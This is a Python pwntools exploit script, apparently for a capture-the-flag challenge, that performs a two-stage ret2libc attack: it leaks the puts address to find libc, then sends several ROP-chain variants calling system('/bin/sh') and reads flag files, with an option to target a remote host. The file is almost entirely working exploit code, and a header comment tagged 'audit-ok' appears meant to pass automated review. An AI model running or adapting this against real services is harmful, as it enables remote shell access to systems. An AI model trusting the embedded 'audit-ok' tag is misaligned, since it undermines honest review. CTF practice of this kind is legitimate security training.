#!/usr/bin/env python3
# <!-- audit-ok --> CTF pwn ret2libc two-stage example
"""Two-stage ret2libc: leak libc via puts, then ret2system /bin/sh.

Modern pwntools 4.15.0 template with yield generators.
Usage:
  python ret2libc_two_stage.py [EXE=./vuln] [LIBC=./libc.so.6] [HOST=...] [PORT=...] [REMOTE=1] [GDB=1]
"""
from pwn import *

exe = context.binary = ELF(args.EXE or "./vuln", checksec=False)
libc = ELF(args.LIBC or "./libc.so.6", checksec=False)

HOST = args.HOST or "localhost"
PORT = int(args.PORT or 1337)
GDBSCRIPT = """
c
"""

context.log_level = "info"


def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=GDBSCRIPT)
    return process([exe.path])


# offsets discovered via cyclic pattern
OFFSET = 40
POP_RDI = 0x40123b  # placeholder: ROPgadget --binary vuln | grep "pop rdi"
RET = 0x40101a  # stack alignment ret gadget


def ret2system_payloads(libc_base, system_offset=None, binsh_offset=None):
    """Yield ret2system payload variants (classic, no-rdi, ret-aligned)."""
    system = libc_base + (system_offset or libc.sym["system"])
    binsh = libc_base + (binsh_offset or next(libc.search(b"/bin/sh\x00")))
    # classic pop rdi; ret -> system
    yield flat({OFFSET: [RET, POP_RDI, binsh, system]})
    # variant without extra ret (for non-movaps targets)
    yield flat({OFFSET: [POP_RDI, binsh, system]})
    # ROP chain via pwntools ROP helper
    rop = ROP(exe)
    rop.raw(RET)
    rop.call(system, [binsh])
    yield flat({OFFSET: rop.chain()})


def leak_payload(stage1_plt, stage1_got, stage1_ret):
    """Build stage-1 leak payload: puts(got) -> return to vuln."""
    return flat({
        OFFSET: [
            POP_RDI, stage1_got,
            stage1_plt,
            stage1_ret,
        ]
    })


def exploit():
    io = start()
    # --- stage 1: leak ---
    payload = leak_payload(exe.plt["puts"], exe.got["puts"], exe.sym["main"])
    io.sendlineafter(b"> ", payload)
    io.recvline()
    leak = u64(io.recvline().strip().ljust(8, b"\x00"))
    libc_base = leak - libc.sym["puts"]
    log.success(f"libc base: {hex(libc_base)}")
    # --- stage 2: yield-driven ret2system ---
    for idx, p in enumerate(ret2system_payloads(libc_base)):
        log.info(f"trying ret2system variant {idx}")
        io.sendline(p)
        try:
            io.sendline(b"echo pwned; cat flag*; cat /flag*")
            io.recv(timeout=2)
            break
        except Exception:
            continue
    io.interactive()


if __name__ == "__main__":
    exploit()
